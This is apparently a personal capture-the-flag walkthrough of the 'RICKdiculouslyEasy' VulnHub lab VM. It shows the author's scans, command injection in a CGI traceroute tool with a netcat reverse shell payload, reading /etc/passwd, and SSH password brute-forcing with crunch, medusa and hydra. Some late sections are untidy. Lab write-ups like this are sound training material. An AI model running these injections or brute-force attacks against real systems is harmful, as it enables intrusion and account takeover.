# RICKdiculouslyEasy

### Description (from VulnHub)

```
Back to the Top
This is a fedora server vm, created with virtualbox.

It is a very simple Rick and Morty themed boot to root.

There are 130 points worth of flags available (each flag has its points recorded with it), you should also get root.

It's designed to be a beginner ctf, if you're new to pen testing, check it out!
```

* * *

## Finding the IP address of the Vuln Machine

I ran `sudo arp-scan 10.0.0.0/24`
![Optional Text](/Rickdiculously%20Easy/_resources/32a1b37e8b2c47cc8ed70ce1e649487f.png)

* * *

## Nmap scan results

```
# Nmap 7.80 scan initiated Wed Apr 21 11:03:27 2021 as: nmap -sC -sV -oA nmapscans/rid-easy 10.0.0.137
Nmap scan report for 10.0.0.137
Host is up (0.00046s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.0.186
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http       Apache httpd 2.4.27 ((Fedora))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Fedora)
|_http-title: Morty's Website
9090/tcp open  http       Cockpit web service
|_http-title: Did not follow redirect to https://10.0.0.137:9090/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# cleNmap done at Wed Apr 21 11:04:03 2021 -- 1 IP address (1 host up) scanned in 36.53 seconds
```

* * *

### Looking at the NAMP scan results

I look at `https://10.0.0.137:9090/` and I see (below image). We got our First Flag! 
Other than the flag there didn't seem to be much here so I moved on and attempted an anonymous login via FTP.
![Optional Text](/Rickdiculously%20Easy/_resources/28c5f1cc424b4876b5ee99bb7015065d.png)

### FTP Anonymous Login
I used `ftp 10.0.0.137` to connect and for the **username&passwords** I used **Anonymous** when prompted.
![Optional Text](/Rickdiculously%20Easy/_resources/b12fe3b23b265e5ec5fe295ae5a5caa2.png)

Once logged in, running`ls` return a file and directory. I then used `wget -m ftp://anonymous:anonymous@10.0.0.137` to retrieve the file(s). Alternativley you could use the `get` cmd or filezilla.

After running `wget -m ftp://anonymous:anonymous@10.0.0.137`. I `cd` into the directory it created and `cat` the `Flag.txt` file

Looks like we got our second flag!

![Optional Text](/Rickdiculously%20Easy/_resources/380d1b0562be4575a485325880fd6713.png)

**So far, we found 2 flags for a total of 20 points, and 110 points left to go.**

* * *

## Nikto scan results

I ran `nikto -h 10.0.0.137:80`
![Optional Text](/Rickdiculously%20Easy/_resources/e80a8432e21b47f8bb96a19a801c69a9.png)

* * *

Looking at the `/passwords/` dir I see

![Optional Text](/Rickdiculously%20Easy/_resources/583ddbbb5a134746a502bbbdd01d5b6d.png)

* * *

After clicking on FLAG.txt we get another Flag!

![Optional Text](/Rickdiculously%20Easy/_resources/a149221d696b42239fedfef08d456a1d.png)

* * *

Obvisouly passwords.html seems interesting. The page has a message for Morty!

![Optional Text](/Rickdiculously%20Easy/_resources/be61f44dc89b433995b0bdda425d1160.png)

**The message**

```
Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.
```

Looks like Rick has hidden the password, this prompts me to review the source code.

* * *

Looking at the source of `10.0.0.137/passwords/passwords.html` I see:
![Optional Text](/Rickdiculously%20Easy/_resources/3be9c5f2d8c34c6e8156c476ac324836.png)

* * *

**Great as of right now we have a password, `winter`, and 30 points, 100 left to go!**

* * *

Moving forward, I look at `http://10.0.0.137/robots.txt`

![Optional Text](/Rickdiculously%20Easy/_resources/82ef1851635e93951b8f688f44d6aa7a.png)
```
They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
```

I go to `10.0.0.137/cgi-bin/root_shell.cgi` hoping it was going to be this easy lol, but I was quickly dissapointed!
![Optional Text](/Rickdiculously%20Easy/_resources/c1d060c970384b449cadc580c55915b8.png)

I then take a look at `http://10.0.0.137/cgi-bin/tracertool.cgi`
![Optional Text](/Rickdiculously%20Easy/_resources/9ac3412d75fd4194b063f8a52debd39d.png)

I look at `http://10.0.0.137/cgi-bin/tracertool.cgi` and after some testing I realize it was vulnerable to command injection. I confirmed by running `1.2.3.4;uname -r` it returned 4.11.8-300.fc26.x86_64 looks like the semicolon did the trick. I was able to get a reverse shell but after playing around I didn't have much luck. I printed out the `/etc/passwd`. The cat command didn't work, but I encourage you to try, someone has a great since of humor! I used `nl` instead

### Reverse Shell
Local Machine Run: `nc -lvnp 4444`

Go to `http://10.0.0.137/cgi-bin/tracertool.cgi` and in the dialog box put `; nc 10.0.0.186 4444 -e /bin/bash;` click trace

You can also print out the `/etc/passwd` with the tracertool by placing `;nl /etc/passwd` in the dialog box

![Optional Text](/Rickdiculously%20Easy/_resources/6a8dee2210714497bd66728abccf025e.png)

**Great now we have some usernames!**
```
27 RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
28 Morty:x:1001:1001::/home/Morty:/bin/bash
29 Summer:x:1002:1002::/home/Summer:/bin/bash
30 apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
```
My guess is the password we found earlier `winter` has to belong to one of these users! After testing the creds manually. We got in with **Summer&winter** via ftp.

## FTP Login

I was able to login via FTP and found the next FLAG. **40 points found and 90 left to go!**

![Optional Text](/Rickdiculously%20Easy/_resources/33bd2ec1b02544c698bae44d6cef7f85.png)

## You can login using the sequence below
```
Ftp Command=`ftp 10.0.0.137`
Username=`Summer`
Password=`winter`
```
Listing out the contents of Rick & Morty's home dir I see some interesting files.
![Optional Text](/Rickdiculously%20Easy/_resources/abef03390a739b61c1fcc6d875336b65.png)

**Listing the Directories**
`ls /home/RickSanchez`
`ls /home/Morty`

I used filezilla to move the files to my machine. To unzip journal.txt.zip the file found in Morty's home directory, I needed a password. Since I didn't know the password, I continued on.

I moved onto Rick's home Dir. First Looking at the `RICKS_SAFE` directory. Inside there was an .exe named `safe` and another directory `ThisDoesntContainAnyFlags`. Inside `ThisDoesntContainAnyFlags` was a file called `NotAFlag.txt`. I wasn't able to run the exe even after moving the file to my machine unless I installed a libmcrypt. I didn't want to do that plus I figured I was missing something at this point!

**Contents of** `NotAFlag.txt`

```
hhHHAaaaAAGgGAh. You totally fell for it... Classiiiigihhic.
But seriously this isn't a flag..
```
I looked over my notes from the machine and decided to do a little more enumeration. The first thing I did was run a full port nmap scan.

![Optional Text](/Rickdiculously%20Easy/_resources/a6df27299520dc839dc8c3c5fb6ac8e9.png)

After running the scan I see several ports that I didn't see before, oops! So I ran `nmap -sC -sV -sS -p 13337,22222,60000 10.0.0.137`.
In a real world enviroment, its not a good idea to run nmap with `-T5`. It will get you caught!

### Output from `nmap -sC -sV -sS -p 13337,22222,60000 10.0.0.137`
```
Nmap scan report for 10.0.0.137
Host is up (0.00023s latency).

PORT      STATE SERVICE VERSION
13337/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
60000/tcp open  unknown
|_drda-info: ERROR
| fingerprint-strings: 
|   NULL, ibm-db2: 
|_    Welcome to Ricks half baked reverse shell...
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port13337-TCP:V=7.80%I=7%D=5/1%Time=608DB7D9%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port60000-TCP:V=7.80%I=7%D=5/1%Time=608DB7DF%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.\
SF:.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20rev
SF:erse\x20shell\.\.\.\n#\x20");
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.71 seconds

```
Another Flag! `FLAG:{TheyFoundMyBackDoorMorty}-10Points` **50 Points found 80 Left!**

Noticing the odd text under **NEXT SERVICE FINGERPRINT**

### Odd Text
```
"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.\ SF:.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20rev SF:erse\x20shell\.\.\.\n#\x20");
```
Mhhmmm! Did Rick leave a Reverse Shell Open? 

I used `nc 10.0.0.137 60000`

![Optional Text](/Rickdiculously%20Easy/_resources/RickRevShell.png)

Another Flag! `FLAG{Flip the pickle Morty!} - 10 Points`

**60 Points found. 70 Left!**


## SSH
 From the new and imporved nmap scan, SSH Looks like it's runnning on **port 22222**.

The only creds I have our **Summer:winter**So I attempt a login with `ssh Summer@10.0.0.137 -p 22222`. Success! After logging in, I wanted to see if I could run `/home/RickSanchez/RICKS_SAFE/safe` but when I tried I recieved a **permission denied** 

I ran `ls /home/Morty/` and this time I can see another file 
![Optional Text](/Rickdiculously%20Easy/_resources/Safe_Password.png)

### Copied the file to Summers Home DIR so I could move it to my machine

`cp /home/Morty/Safe_Password.jpg /home/Summer`

I then used  https://stegonline.georgeom.net/upload to upload the image and extract text.

[http://10.0.0.0.137/cgi-bin/tracertool.cgi?parameter=||whoami](http://10.0.0.0.137/cgi-bin/tracertool.cgi?

[http://10.0.0.137/cgi-bin/tracertool.cgi?ip=||whoami>/var/www/output.txt||](http://10.0.0.137/cgi-bin/tracertool.cgi?ip=%7C%7Cwhoami%3E/var/www/output.txt%7C%7C)

![Optional Text](/Rickdiculously%20Easy/_resources/9cdc677064af42528e30c76533c43823.png)

![Optional Text](/Rickdiculously%20Easy/_resources/1db82e2b853c4415a3f1f55b438e93b0.png)

Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

20 points

Anyway. Here it is:

Here it is:

./safe 131333

![Optional Text](/Rickdiculously%20Easy/_resources/a932636ee913450eb6a3bfa08c8ca6fb.png)


[Had to do some reading](https://www.rootinstall.com/tutorial/creating-custom-wordlists-using-crunch-utility/)
  
 1227  crunch 5 5 -t ,%the -o password.txt 
 1229  crunch 5 5 -t ,%The >> password.txt 
 1230  crunch 7 7 -t ,%Flesh >> password.txt 
 1231  crunch 7 7 -t ,%flesh >> password.txt 
 1232  crunch 9 9 -t ,%curtains >> password.txt 
 1233  crunch 10 10 -t ,%curtains >> password.txt 
 1234  crunch 10 10 -t ,%Curtains >> password.txt 


medusa -u RickSanchez -P password.txt -h 10.0.0.137 -M ssh -n 22222 -f

![Optional Text](/Rickdiculously%20Easy/_resources/517dc2facf2a4a9b91a21237171ec7ea.png)
ACCOUNT FOUND: [ssh] Host: 10.0.0.137 User: RickSanchez Password: P7Curtains [SUCCESS]**strong text**

## !!Optional!!
I also used cupp.py to generate passwords. Really easy to use tool
[GitHub For Cupp.py](https://github.com/Mebus/cupp)

run ./cupp.py -i
![Optional Text](/Rickdiculously%20Easy/_resources/809a450dc68d431c89b94e25f145b714.png)

Used hyrdra install of medusa 
hydra -l RickSanchez -P the.txt 10.0.0.137 -s22222 ssh

![Optional Text](/Rickdiculously%20Easy/_resources/517dc2facf2a4a9b91a21237171ec7ea.png)
ACCOUNT FOUND: [ssh] Host: 10.0.0.137 User: RickSanchez Password: P7Curtains [SUCCESS]

